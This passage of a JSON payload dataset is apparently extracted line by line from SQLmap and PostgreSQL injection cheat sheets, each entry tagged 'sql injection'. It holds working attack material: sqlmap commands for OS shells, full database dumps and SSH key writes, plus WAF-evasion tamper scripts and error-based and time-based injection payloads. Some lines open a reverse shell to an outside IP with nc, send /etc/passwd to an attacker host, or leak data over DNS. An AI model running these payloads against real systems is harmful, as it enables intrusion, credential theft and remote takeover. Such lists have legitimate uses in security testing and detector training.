    "payload": "    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    match = re.search(r\"(?i)LIMIT\\s*(\\d+),\\s*(\\d+)\", payload or \"\")\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "        retVal = retVal.replace(match.group(0), \"LIMIT %s OFFSET %s\" % (match.group(2), match.group(1)))\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    sqlmap -u \"http://target.com/vuln.php?id=1\" --tamper=mytamper\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --sql-query=\"SELECT version()\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import random; id=random.randint(1,10)\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import hashlib;id2=hashlib.md5(id).hexdigest()\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    print(\"Preprocess\")\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?category=demo\" -p category --test-filter=\"Generic UNION query (NULL)\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?category=demo\" --test-filter=\"boolean\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?id=1\" --level=1 --risk=1\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?id=1\" --technique=B\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -d \"mysql://user:pass@ip/database\" --dump-all\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "> However you should always know how SQLmap is working, and be able to replicate it manually if necessary.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "By defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com\" --data \"username=admin&password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\"  -p id --sql-shell",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\"  -p id --os-shell",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\"  -p id --os-pwn",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "This method is not advisable for penetration testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like \"delete\" or \"destroy\" endpoints.",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://www.target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\" --proxy-cred=\"user:pass\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"http://user:pass@127.0.0.1:8080\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"socks4://[username]:[password]@[proxy_ip]:[proxy_port]\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"socks4://user:pass@127.0.0.1:1080\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"socks5://[username]:[password]@[proxy_ip]:[proxy_port]\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "proxy=\"socks5://user:pass@127.0.0.1:1080\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://targetwebsite.com/vulnerablepage.php?id=1\" --tamper=<tamper-script-name>",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "| Tamper | Description |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|0x2char.py | Replaces each (MySQL) 0xHEX encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|base64encode.py | Base64 all characters in a given payload  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|escapequotes.py | Slash escape quotes (' and \") |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|ifnull2casewhenisnull.py | Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|least.py | Replaces greater than operator ('>') with 'LEAST' counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|modsecurityversioned.py | Embraces complete query with versioned comment |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|multiplespaces.py | Adds multiple spaces around SQL keywords |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|percentage.py | Adds a percentage sign ('%') infront of each character  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|plus2concat.py | Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|plus2fnconcat.py | Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|randomcase.py | Replaces each keyword character with random case value |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|randomcomments.py | Add random comments to SQL keywords|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|securesphere.py | Appends special crafted string |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2comment.py | Replaces space character (' ') with comments |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2plus.py |  Replaces space character (' ') with plus ('+')  |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and \\|\\|) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|varnish.py | Append a HTTP header 'X-originating-IP' |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "The following code is an example of a tamper script that replace instances like '`LIMIT M, N`' with '`LIMIT N OFFSET M`' counterpart:",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "match = re.search(r\"(?i)LIMIT\\s*(\\d+),\\s*(\\d+)\", payload or \"\")",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "retVal = retVal.replace(match.group(0), \"LIMIT %s OFFSET %s\" % (match.group(2), match.group(1)))",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "* Place it inside SQLmap's `tamper/` directory, typically:",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://target.com/vuln.php?id=1\" --tamper=mytamper",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --sql-query=\"SELECT version()\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import random; id=random.randint(1,10)\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import hashlib;id2=hashlib.md5(id).hexdigest()\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "print(\"Preprocess\")",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?category=demo\" -p category --test-filter=\"Generic UNION query (NULL)\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?category=demo\" --test-filter=\"boolean\"",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?id=1\" --level=1 --risk=1",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"https://www.target.com/page.php?id=1\" --technique=B",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -d \"mysql://user:pass@ip/database\" --dump-all",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT database_to_xml(true,true,''); -- dump the current database to XML\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": ";(select 1 from pg_sleep(5))\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "||(select 1 from pg_sleep(5))\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "declare c text;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "declare p text;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT into p (SELECT YOUR-QUERY-HERE);\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "execute c;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "END;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "$$ language plpgsql security definer;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT f();\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    select pg_ls_dir('./');\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    select pg_read_file('PG_VERSION', 0, 200);\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    CREATE TABLE temp(t TEXT);\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    COPY temp FROM '/etc/passwd';\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT * FROM temp limit 1 offset 0;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT lo_get(16420); -- use the OID returned from the above\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT * from pg_largeobject; -- or just get all the large objects and their data\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    CREATE TABLE nc (t TEXT);\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT * FROM nc;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    COPY nc(t) TO '/tmp/nc.sh';\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE TABLE shell(output text);\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SHOW is_superuser; \n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT current_setting('is_superuser');\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Type                | Comment |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| ------------------- | ------- |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Single-Line Comment | `--`    |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Multi-Line Comment  | `/**/`  |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Description            | SQL Query                               |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| ---------------------- | --------------------------------------- |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| DBMS version           | `SELECT version()`                      |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Database Name          | `SELECT CURRENT_DATABASE()`             |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Database Schema        | `SELECT CURRENT_SCHEMA()`               |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Current User           | `SELECT user;`                          |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Current User           | `SELECT current_user;`                  |",
